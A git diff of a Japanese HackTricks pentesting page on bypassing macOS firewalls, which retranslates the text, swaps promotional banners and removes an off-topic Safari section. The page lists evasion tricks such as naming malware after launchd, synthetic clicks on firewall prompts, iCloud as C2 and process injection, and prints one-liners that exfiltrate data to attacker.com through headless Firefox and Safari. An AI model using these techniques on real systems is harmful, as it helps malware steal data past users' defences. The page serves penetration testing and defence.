@@ -1,36 +1,38 @@
-# macOS ファイアウォールの回避方法
+# macOS ファイアウォールのバイパス
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-## 発見された技術
+## 見つかった技術
 
-以下の技術は、一部のmacOSファイアウォールアプリで動作することが確認されました。
+以下の技術は、いくつかのmacOSファイアウォールアプリで機能していることが確認されています。
 
 ### ホワイトリスト名の悪用
 
-* 例えば、マルウェアを**`launchd`**などのよく知られたmacOSプロセスの名前で呼び出す
+* 例えば、**`launchd`** のようなmacOSのよく知られたプロセスの名前でマルウェアを呼び出す
 
 ### シンセティッククリック
 
-* ファイアウォールがユーザーに許可を求める場合、マルウェアが**許可をクリック**する
+* ファイアウォールがユーザーに許可を求める場合、マルウェアで**許可をクリックする**
 
-### **Appleの署名済みバイナリの使用**
+### **Apple署名済みバイナリの使用**
 
-* **`curl`**のようなものだけでなく、**`whois`**なども含まれます
+* **`curl`** のようなものですが、**`whois`** のような他のものもあります
 
-### よく知られたAppleのドメイン
+### よく知られたappleドメイン
 
-ファイアウォールは、**`apple.com`**や**`icloud.com`**などのよく知られたAppleのドメインへの接続を許可している場合があります。そしてiCloudはC2として使用される可能性があります。
+ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られたappleドメインへの接続を許可している可能性があります。そしてiCloudはC2として使用できます。
 
 ### 一般的なバイパス
 
@@ -38,19 +40,19 @@
 
 ### 許可されたトラフィックの確認
 
-許可されたトラフィックを知ることで、ホワイトリストに登録されている可能性のあるドメインや、それらにアクセスできるアプリケーションを特定することができます
+許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されているドメインや、それらにアクセスできるアプリケーションを特定するのに役立ちます。
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### DNSの悪用
 
-DNSの解決は、おそらくDNSサーバーに接続することが許可されるであろう**`mdnsreponder`**という署名済みアプリケーションを介して行われます。
+DNS解決は、おそらくDNSサーバーに接触することが許可される署名されたアプリケーション**`mdnsreponder`**を介して行われます。
 
 <figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
-### ブラウザアプリを介して
+### ブラウザアプリ経由
 
-* **oascript**
+* **osascript**
 ```applescript
 tell application "Safari"
 run
@@ -71,31 +73,13 @@ end tell
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-# macOS ファイアウォールのバイパス
-
-macOS には、ネットワークセキュリティを強化するための組み込みのファイアウォールがあります。しかし、ハッカーはこのファイアウォールを回避する方法を見つけることがあります。このセクションでは、macOS ファイアウォールをバイパスするためのいくつかのテクニックを紹介します。
-
-## Safari の使用
-
-Safari は macOS のデフォルトのウェブブラウザであり、ファイアウォールをバイパスするための有用なツールとなり得ます。Safari を使用すると、ファイアウォールの制限を回避して、ネットワーク上のリソースにアクセスすることができます。
-
-以下に、Safari を使用してファイアウォールをバイパスする方法を示します。
-
-1. Safari を開きます。
-2. アドレスバーにアクセスしたいウェブサイトの URL を入力します。
-3. Enter キーを押してウェブサイトにアクセスします。
-
-Safari は、macOS ファイアウォールの制限を回避するために、ネットワークトラフィックを通過させることができます。これにより、ファイアウォールによってブロックされることなく、ウェブサイトやリソースにアクセスすることができます。
-
-ただし、Safari を使用してファイアウォールをバイパスする場合でも、セキュリティには十分な注意を払う必要があります。ファイアウォールの制限を回避することは、セキュリティリスクを伴う可能性があるため、慎重に行う必要があります。
-
-以上が、Safari を使用して macOS ファイアウォールをバイパスする方法です。
+* Safari
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### プロセスインジェクションを介して
 
-もし、**任意のサーバーに接続できるプロセスにコードをインジェクション**できれば、ファイアウォールの保護を回避することができます:
+任意のサーバーに接続が許可されているプロセスに**コードをインジェクト**できれば、ファイアウォールの保護をバイパスできる可能性があります：
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -107,12 +91,14 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローになる方法を学ぶ</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法：
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
